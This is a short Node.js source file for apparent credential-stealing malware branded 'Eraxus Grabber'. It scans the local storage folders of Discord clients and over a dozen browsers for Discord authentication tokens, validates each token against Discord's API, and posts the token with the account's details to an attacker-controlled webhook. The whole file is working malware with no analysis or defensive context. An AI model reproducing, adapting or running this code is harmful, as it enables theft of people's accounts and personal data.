const fs = require('fs')
const fetch = require("sync-fetch")

var webhook = "%WEBHOOKURL%"
var roaming = process.env.appdata
var local = process.env.localappdata
var paths = [`${roaming}/Discord/Local Storage/leveldb`, `${roaming}/DiscordDevelopment/Local Storage/leveldb`, `${roaming}/Lightcord/Local Storage/leveldb`, `${roaming}/discordptb/Local Storage/leveldb`, `${roaming}/discordcanary/Local Storage/leveldb`, `${roaming}/Opera Software/Opera Stable/Local Storage/leveldb`, `${roaming}/Opera Software/Opera GX Stable/Local Storage/leveldb`, `${local}/Amigo/User Data/Local Storage/leveldb`, `${local}/Torch/User Data/Local Storage/leveldb`, `${local}/Kometa/User Data/Local Storage/leveldb`, `${local}/Orbitum/User Data/Local Storage/leveldb`, `${local}/CentBrowser/User Data/Local Storage/leveldb`, `${local}/7Star/7Star/User Data/Local Storage/leveldb`, `${local}/Sputnik/Sputnik/User Data/Local Storage/leveldb`, `${local}/Vivaldi/User Data/Default/Local Storage/leveldb`, `${local}/Google/Chrome SxS/User Data/Local Storage/leveldb`, `${local}/Epic Privacy Browser/User Data/Local Storage/leveldb`, `${local}/Google/Chrome/User Data/Default/Local Storage/leveldb`, `${local}/uCozMedia/Uran/User Data/Default/Local Storage/leveldb`, `${local}/Microsoft/Edge/User Data/Default/Local Storage/leveldb`, `${local}/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`, `${local}/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb`, `${local}/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`]

paths.forEach(r => main(r))

function main(p) {
    try {
        if (!fs.existsSync(p)) return
        var dirContent = fs.readdirSync(p)
        var z = dirContent.filter(f => f.endsWith("ldb"))
        z.forEach(r => {
            var LDBContent = fs.readFileSync(`${p}/${r}`).toString()
            let NoMFA = /[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}/;
            let MFA = /mfa\.[\d\w_-]{84}/;
            let [token] = NoMFA.exec(LDBContent) || MFA.exec(LDBContent) || [null];
            if (token) {
                var res = fetch(`https://discord.com/api/v9/users/@me`, {
                    headers: {
                        authorization: token
                    }
                }).json()
                if (res.id) send(res, token)
            }

        })
    } catch (e) {}
}

function send(res, token) {
    res.premium_type = getNitro(res.premium_type)
    res.token = token
    var fields = []
    for (p in res) {
        !res[p] ? res[p] = "None" : res[p] = res[p]
        fields.push({
            name: p,
            value: res[p],
            inline: Math.random() * 5 > 2
        })
    }
    res.avatar = `[Click Here For AvatarURL](https://cdn.discordapp.com/avatars/${res.id}/${res.avatar}.png)`
    fetch(webhook, {
        method: "POST",
        headers: {
            "Content-Type": 'application/json'
        },
        body: JSON.stringify({
            embeds: [{
                title: "Eraxus Grabber",
                fields: fields,
                image: {
                    url: "https://cdn.discordapp.com/attachments/937097630574604309/966182159167655936/image.png"
                },
                thumbnail: {
                    url: `https://cdn.discordapp.com/avatars/${res.id}/${res.avatar}.png`
                },
                color:	43690
            }],
            username: "Eraxus Grabber",
            avatar_url: "https://cdn.discordapp.com/attachments/937097630574604309/966183977771761684/5944ab8e0ccb07b03e81ed25f05567c9.jpg"
        })
    })
}

function getNitro(self) {
    switch(self) {
        case 1: return "Nitro Classic"
        case 2: return "Nitro Boost"
        default: return "No Nitro"
    }
}